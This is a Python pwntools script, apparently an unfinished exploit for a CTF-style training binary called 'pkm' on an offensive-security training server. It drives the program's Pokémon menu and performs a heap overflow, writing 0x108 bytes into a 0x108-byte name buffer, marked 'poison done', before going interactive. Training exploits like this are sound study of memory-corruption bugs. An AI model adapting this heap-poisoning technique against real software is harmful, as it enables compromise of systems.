from pwn import *
from sys import *
from time import sleep

SERVER = "bin.training.offdef.it"
PORT = ""
BINARY = "./pkm_patched"


if "--remote" in sys.argv:
    r = remote(SERVER, PORT)
else:
    r = process(BINARY)

if "--debug" in sys.argv: 
    gdb.attach(r, """
        #breakpoints
        b* 
        c
        """)
    #input("wait")

timesleep = 0.2
pokemons = [0 for i in range(0x32)]

#code functions
def addPkm():
    global pokemons

    r.recvuntil(b'>')
    r.sendline(b'0')
    sleep(timesleep)
    for i in range(len(pokemons)):
        if pokemons[i]==0:
            pokemons[i]=1
            return i
    return -1

def renamePkm(index, length, name):
    r.recvuntil(b'>')
    r.sendline(b'1')
    sleep(timesleep)
    r.recvuntil(b'>')
    r.sendline(b"%d" % index)
    sleep(timesleep)
    r.recvuntil(b':')
    r.sendline(b"%d" % length)
    sleep(timesleep)
    if len(name)==length:
        print("LOOOOL")
        r.send(name)
        sleep(timesleep)
    else: 
        r.sendline(name)
        sleep(timesleep)

def killPkm(index):
    global pokemons
    pokemons[index]=0
    r.recvuntil(b'>')
    r.sendline(b'2')
    sleep(timesleep)
    r.recvuntil(b'>')
    r.sendline(b"%d" % index)
    sleep(timesleep)

def fightPkm(index_pokemon, index_move, index_reciver_move):
    global pokemons
    if pokemons[index_pokemon]!=1 or pokemons[index_reciver_move]!=1:
        print("BRO NON ESISTONO QUESTI POKEMON COME CAZZO PROGRAMMI")
        exit(0)
    r.recvuntil(b'>')
    r.sendline(b'3')
    sleep(timesleep)
    r.recvuntil(b'>')
    r.sendline(b"%d" % index_pokemon)
    sleep(timesleep)
    r.recvuntil(b'>')
    r.sendline(b"%d" % index_move)
    sleep(timesleep)
    r.recvuntil(b'>')
    r.sendline(b"%d" % index_reciver_move)
    sleep(timesleep)

def infoPkm(index):
    global pokemons
    if pokemons[index]!=1:
        print("BRO NON ESISTONO QUESTI POKEMON COME CAZZO PROGRAMMI")
        exit(0)
    r.recvuntil(b'>')
    r.sendline(b'4')
    sleep(timesleep)
    r.recvuntil(b'>')
    r.sendline(b"%d" % index)
    sleep(timesleep)
    x = r.recvuntil(b'***************')
    print("Info-> "+ str(x))

def exitPkm():
    r.recvuntil(b'>')
    r.sendline(b'5')
    sleep(timesleep)

A = addPkm()
B = addPkm()
renamePkm(A, 0x100, b'PIPPO')
renamePkm(B, 0x200, b'PIPPO')
C = addPkm()
renamePkm(B, 0x500, b'PIPPO')
renamePkm(A, 0x108, b'A'*0x108)
#poison done



r.interactive()
